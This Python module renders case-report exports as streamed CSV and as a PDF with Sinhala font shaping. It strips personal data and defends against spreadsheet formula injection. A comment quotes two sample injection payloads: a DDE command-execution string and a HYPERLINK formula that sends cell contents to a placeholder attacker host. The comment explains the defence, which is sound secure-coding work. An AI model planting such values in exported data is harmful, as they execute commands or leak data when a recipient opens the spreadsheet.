"""Case-export rendering (Story 7.2, FR-7.2): CSV streaming + PDF report building.

Lives under infrastructure/ alongside ml/compensation.py and email/email_service.py --
this codebase's as-built architecture is a modular blueprint monolith with NO application
layer (app/application/ is an empty stub package; see architecture.md's 2026-07-10
reconciliation). The HTTP route stays in api/v1/admin.py; only rendering lives here.

NO PII, EVER (AC4 / NFR-3.3). The column set below is the whole contract: no NIC in any
form (not full, not last-4, not submitter_identity_hash), no contact details, no raw GPS. PO-ratified 2026-08-06: canonical_id (HEC-YYYY-NNNN) is
the cross-reference key district managers use against paper DWC records -- the same
resolution Stories 5.3, 5.4 and migration 018 each reached independently.

Sinhala rendering: cases.district and cases.ds_division_id hold Sinhala names (see
backend/ml/models/district_reference.json). reportlab's built-in Type-1 fonts have no
Sinhala glyphs, so a Noto Sans Sinhala TTF is vendored under fonts/ and registered with
shapable=True (HarfBuzz via uharfbuzz) -- without shaping, Sinhala below-base vowel signs
and conjuncts render as detached glyphs. Registration degrades to Helvetica with a logged
warning rather than failing the request.
"""

import csv
import io
import logging
import os
from datetime import datetime, timezone

from xml.sax.saxutils import escape

from reportlab.lib import colors
from reportlab.lib.pagesizes import landscape, A4
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.units import mm
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle

logger = logging.getLogger(__name__)

# AC1's column contract. Single source of truth -- the route SELECTs in this order, the CSV
# header row is written from it, and the tests assert against it, so the three can never drift.
CSV_COLUMNS = [
    "canonical_id",
    "submitted_at",
    "damage_category",
    "ai_confidence",
    "was_overridden",
    "status",
    "approved_amount_lkr",
    "district",
    "ds_division_id",
]

# Narrower subset for the PDF -- a 9-column table on A4 landscape is unreadable, and the PDF
# is the human-facing formal report (the CSV is the complete machine-readable record).
PDF_COLUMNS = [
    ("canonical_id", "Reference"),
    ("submitted_at", "Submitted"),
    ("damage_category", "Damage"),
    ("ai_confidence", "AI Conf."),
    ("status", "Status"),
    ("approved_amount_lkr", "Approved (LKR)"),
    ("ds_division_id", "DS Division"),
]

_FONT_DIR = os.path.join(os.path.dirname(__file__), "fonts")
_SINHALA_FONT_PATH = os.path.join(_FONT_DIR, "NotoSansSinhala-VF.ttf")
SINHALA_FONT_NAME = "NotoSansSinhala"
_FALLBACK_FONT_NAME = "Helvetica"

_registered_font = None


def _sinhala_font():
    """Registers the vendored Sinhala TTF once and returns the usable font name.

    Follows admin.py::_load_valid_districts()'s lazy-load-once shape, including its code-review
    lesson: a FAILED load is not cached. Caching the fallback on one transient read error would
    silently downgrade every PDF for the life of the worker process; retrying next call is cheap
    and self-healing.
    """
    global _registered_font
    if _registered_font is not None:
        return _registered_font
    try:
        # shapable=True routes text through HarfBuzz (uharfbuzz). Sinhala is a complex script:
        # without shaping, below-base vowel signs (e.g. U+0DD4) and yansaya/rakaransaya
        # conjuncts render as separate, mispositioned glyphs instead of composed forms.
        pdfmetrics.registerFont(TTFont(SINHALA_FONT_NAME, _SINHALA_FONT_PATH, shapable=True))
        _registered_font = SINHALA_FONT_NAME
    except Exception:
        # Never fail an export over a font problem -- a Latin-only report beats a 500.
        logger.exception("Sinhala font registration failed; falling back to %s", _FALLBACK_FONT_NAME)
        return _FALLBACK_FONT_NAME
    return _registered_font


def _fmt_datetime(value):
    """Renders a timestamp as UTC `YYYY-MM-DD HH:MM:SS`, with no offset suffix.

    cases.submitted_at is TIMESTAMPTZ, so isoformat() appends "+00:00" -- which Excel imports
    as TEXT rather than a date, breaking sorting and date filters in exactly the spreadsheet
    workflow this export exists to serve. Normalising to UTC first keeps the value unambiguous
    (the PDF header states UTC explicitly, and every timestamp here is UTC by construction)
    while staying spreadsheet-native.
    """
    if value is None:
        return ""
    if value.tzinfo is not None:
        value = value.astimezone(timezone.utc).replace(tzinfo=None)
    return value.isoformat(sep=" ", timespec="seconds")


def _fmt_confidence(value):
    """Confidence is DECIMAL(5,4) in [0,1]; presented as a percentage in both outputs."""
    if value is None:
        return ""
    try:
        return f"{float(value) * 100:.1f}%"
    except (TypeError, ValueError):
        return ""


def _fmt_amount(value):
    if value is None:
        return ""
    try:
        return f"{float(value):,.2f}"
    except (TypeError, ValueError):
        return ""


def _fmt_bool(value):
    # Explicitly distinguishes "no inference row at all" (None -> "") from a real False.
    # Most cases today have no inference_log row (only the officer classify path writes one),
    # so collapsing None into "false" would fabricate a finding that was never made.
    if value is None:
        return ""
    return "true" if value else "false"


# Characters that make Excel/LibreOffice treat a cell as a formula rather than text.
# Review finding (Blind Hunter + Edge Case Hunter, confirmed): cases.damage_category is
# TEXT NOT NULL with NO CHECK constraint (migration 002) and cases.py validates only
# "non-empty str", so a citizen-supplied value like =cmd|'/c calc'!A1 or
# =HYPERLINK("http://attacker/"&A1,"Open") reaches this export verbatim. Excel is the
# STATED primary consumer of the CSV (it is why the BOM exists), so the payload would
# execute on a district manager's workstation.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _defuse(value: str) -> str:
    """Neutralises spreadsheet formula injection by prefixing a single quote.

    A leading apostrophe is the conventional escape: Excel/LibreOffice render the cell as
    literal text and strip the quote from the display. csv.writer quotes correctly but does
    NOT neutralise — quoting is not a defence against formula evaluation.
    """
    if value and value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def format_row(row):
    """Formats one DB row into display strings, in CSV_COLUMNS order.

    Shared by the CSV and PDF paths so the two renderings can never disagree about how a
    value is presented.
    """
    canonical_id, submitted_at, damage_category, confidence, was_overridden, status, approved, district, ds_division = row
    return {
        # Only the free-text, DB-sourced columns need defusing; the generated/derived ones
        # (canonical_id, timestamps, formatted numbers, booleans) cannot start with a
        # formula prefix by construction.
        "canonical_id": canonical_id or "",
        "submitted_at": _fmt_datetime(submitted_at),
        "damage_category": _defuse(damage_category or ""),
        "ai_confidence": _fmt_confidence(confidence),
        "was_overridden": _fmt_bool(was_overridden),
        "status": _defuse(status or ""),
        "approved_amount_lkr": _fmt_amount(approved),
        "district": _defuse(district or ""),
        "ds_division_id": _defuse(ds_division or ""),
    }


def total_approved(rows) -> float:
    """Sums approved_amount across raw DB rows.

    Reads the value through format_row's own contract rather than a bare positional index
    (review finding): the previous `row[6]` re-implemented the positional layout that
    format_row already owns, so any future column reorder would have silently summed a
    Sinhala district string, hit the surrounding `except (TypeError, ValueError): pass`,
    and printed an authoritative-looking "TOTAL 0.00" on the formal report instead of
    failing loudly.
    """
    total = 0.0
    for row in rows:
        raw = row[CSV_COLUMNS.index("approved_amount_lkr")]
        if raw is None:
            continue
        total += float(raw)
    return total


def stream_csv(cur, batch_size=500):
    """Yields CSV text incrementally from an already-executed cursor.

    The caller owns the cursor/connection lifetime (see admin.py::export_cases) -- this
    generator only reads. fetchmany() keeps at most `batch_size` rows resident, so a
    10,000-case export never materialises as one list (AC3).

    A UTF-8 BOM is emitted first: without it Excel on Windows decodes the file as the legacy
    ANSI codepage and every Sinhala district name becomes mojibake. The BOM precedes the header
    row and is NOT part of it -- tests assert on the decoded header, not the raw first bytes.
    """
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")

    def _drain():
        value = buf.getvalue()
        buf.seek(0)
        buf.truncate(0)
        return value

    writer.writerow(CSV_COLUMNS)
    yield "﻿" + _drain()

    while True:
        rows = cur.fetchmany(batch_size)
        if not rows:
            break
        for row in rows:
            formatted = format_row(row)
            writer.writerow([formatted[col] for col in CSV_COLUMNS])
        yield _drain()


def build_pdf(rows, district, from_date, to_date, generated_at=None, truncated_from=None):
    """Renders the formal district report (AC2) and returns the PDF bytes.

    Text-only header -- PO-ratified 2026-08-06: no DWC logo asset exists anywhere in this
    repo, so the header carries the report title, district, range and generation timestamp
    instead. Dropping a logo in later is a one-line addition here.

    Unlike the CSV path this necessarily buffers: a PDF's cross-reference table can only be
    written once the document is complete. EXPORT_MAX_ROWS in the route is what bounds it.
    """
    font = _sinhala_font()
    generated_at = generated_at or datetime.now(timezone.utc)

    styles = getSampleStyleSheet()
    title_style = styles["Heading1"].clone("hecTitle")
    title_style.fontName = font
    meta_style = styles["Normal"].clone("hecMeta")
    meta_style.fontName = font
    warn_style = styles["Normal"].clone("hecWarn")
    warn_style.fontName = font
    warn_style.textColor = colors.HexColor("#B3261E")
    # Body cells are rendered as Paragraphs, not bare strings. This is load-bearing twice over
    # (both review findings): (1) reportlab only applies HarfBuzz shaping to text that came
    # from a Paragraph -- a plain Table cell string is drawn via Canvas.drawString(shaping=False)
    # (platypus/tables.py reads cellstyle.shaping, which defaults to None), so Sinhala division
    # names in a bare cell would render with detached vowel signs despite the font being
    # registered shapable; (2) a bare cell cannot wrap, so one long ds_division_id (unvalidated
    # TEXT, migration 010) silently overflowed the frame and cropped the columns beside it.
    cell_style = styles["BodyText"].clone("hecCell")
    cell_style.fontName = font
    cell_style.fontSize = 7.5
    cell_style.leading = 9
    head_style = cell_style.clone("hecHead")
    head_style.textColor = colors.white

    buf = io.BytesIO()
    doc = SimpleDocTemplate(
        buf,
        pagesize=landscape(A4),
        leftMargin=12 * mm,
        rightMargin=12 * mm,
        topMargin=12 * mm,
        bottomMargin=12 * mm,
        title="HEC Case Report",
    )

    formatted = [format_row(r) for r in rows]
    total = total_approved(rows)

    elements = [
        Paragraph("HEC Compensation — District Case Report", title_style),
        # escape() everywhere a DB/JWT-sourced value reaches a Paragraph: Paragraph parses its
        # text as RML markup, so an unclosed tag in a value (verified repro: a district of
        # 'Anuradhapura <b> & Co' raises "Parse error: saw </para> instead of expected </b>")
        # would escape as an unhandled traceback -- the only path in this route that did not
        # return the module's JSON 500, and it fired AFTER the audit row was committed.
        Paragraph(f"District: {escape(str(district))}", meta_style),
        # Stated once here so the offset-free timestamps in the table are unambiguous.
        Paragraph("All times UTC.", meta_style),
        Paragraph(
            "Period: {} to {}".format(
                from_date.isoformat() if from_date else "All",
                to_date.isoformat() if to_date else "All",
            ),
            meta_style,
        ),
        Paragraph(
            f"Generated: {generated_at.strftime('%Y-%m-%d %H:%M UTC')}", meta_style
        ),
    ]

    # Truncation MUST be visible in the document itself (review finding raised independently by
    # all three layers). Previously the only signals were an audit-log field the admin cannot
    # see and a response header the frontend never read -- so a capped export printed
    # "TOTAL | 10000 cases | <partial sum>" as an authoritative district financial figure that
    # silently understated the real position. This is the formal report; it has to say so.
    if truncated_from:
        elements.append(
            Paragraph(
                f"INCOMPLETE REPORT — showing the {len(formatted):,} most recent of "
                f"{truncated_from:,} matching cases. Totals below cover only the rows shown. "
                f"Narrow the filters to produce a complete report.",
                warn_style,
            )
        )
    elements.append(Spacer(1, 8 * mm))

    data = [[Paragraph(escape(label), head_style) for _key, label in PDF_COLUMNS]]
    for item in formatted:
        data.append(
            [Paragraph(escape(item[key]), cell_style) for key, _label in PDF_COLUMNS]
        )

    summary = [Paragraph("", cell_style)] * len(PDF_COLUMNS)
    summary = list(summary)
    summary[0] = Paragraph("<b>TOTAL</b>", cell_style)
    summary[1] = Paragraph(
        f"<b>{len(formatted):,} cases</b>" + (" (partial)" if truncated_from else ""),
        cell_style,
    )
    summary[5] = Paragraph(f"<b>{total:,.2f}</b>", cell_style)
    data.append(summary)

    # Explicit widths so the table always fits the frame (A4 landscape minus 12mm margins
    # = 273mm of usable width); combined with Paragraph cells this makes long values wrap
    # instead of running off the page.
    col_widths = [34 * mm, 34 * mm, 26 * mm, 20 * mm, 34 * mm, 34 * mm, 90 * mm]
    table = Table(data, repeatRows=1, hAlign="LEFT", colWidths=col_widths)
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#2D6A4F")),
                # FONTNAME/FONTSIZE stay for any non-Paragraph content and as a safety net;
                # the Paragraph styles above are what actually drive glyph shaping.
                ("FONTNAME", (0, 0), (-1, -1), font),
                ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                ("GRID", (0, 0), (-1, -1), 0.4, colors.grey),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("BACKGROUND", (0, -1), (-1, -1), colors.HexColor("#F2F7F2")),
            ]
        )
    )
    elements.append(table)

    doc.build(elements)
    return buf.getvalue()
